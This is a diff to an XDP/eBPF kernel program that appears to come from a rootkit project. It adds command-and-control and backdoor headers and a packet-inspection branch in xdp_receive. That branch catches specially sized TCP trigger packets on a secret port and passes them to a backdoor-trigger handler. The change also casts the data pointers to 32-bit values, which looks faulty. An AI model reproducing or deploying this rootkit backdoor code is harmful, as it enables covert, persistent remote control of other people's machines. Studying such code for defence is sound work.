@@ -26,12 +26,14 @@
 
 //User-kernel dependencies
 #include "../common/constants.h"
+#include "../common/c&c.h"
 
 //BPF exclusive includes
 #include "packet/packet_manager.h"
 #include "packet/protocol/tcp_helper.h"
 #include "xdp/xdp_helper.h"
 #include "utils/strings.h"
+#include "xdp/backdoor.h"
 
 //BPF modules to load
 #include "include/bpf/sched.h"
@@ -53,8 +55,8 @@ SEC("xdp_prog")
 int xdp_receive(struct xdp_md *ctx){
     //bpf_printk("BPF triggered\n");
     
-    void *data_end = (void *)(long)ctx->data_end;
-    void *data = (void *)(long)ctx->data;
+    void *data_end = (void *)(__u32)ctx->data_end;
+    void *data = (void *)(__u32)ctx->data;
 
     unsigned int payload_size;
     struct ethhdr *eth = data;
@@ -88,18 +90,29 @@ int xdp_receive(struct xdp_md *ctx){
 
     if (get_tcp_dest_port(tcp) != SECRET_PACKET_DEST_PORT){
         bpf_printk("E %i\n", bpf_ntohs(tcp->dest));
+        bpf_printk("D: %ld, DE:%ld", ctx->data, ctx->data_end);
         return XDP_PASS;
     }
+    bpf_printk("Detected 9000\n");
 
     payload_size = bpf_ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
     payload = (void *)tcp + tcp->doff*4;
 
-    // We use "size - 1" to account for the final '\0', but depending on the program use
-    if (payload_size != sizeof(SECRET_PACKET_PAYLOAD)-1) {
+    //Check for the rootkit backdoor trigger V1
+    if(payload_size == CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE){
+        if (tcp_payload_bound_check(payload, payload_size, data_end)){
+            bpf_printk("G");
+            return XDP_PASS;
+        }
+        return manage_backdoor_trigger_v1(payload, payload_size);
+    }
+    //Check for the packet modification PoC
+    // We use "size - 1" to account for the final '\0'
+    else if (payload_size != sizeof(SECRET_PACKET_PAYLOAD)-1) {
         bpf_printk("F, PS:%i, P:%i, DE:%i\n", payload_size, payload, data_end);
         return XDP_PASS;
     }
-
+    
     if (tcp_payload_bound_check(payload, payload_size, data_end)){
         bpf_printk("G");
         return XDP_PASS;
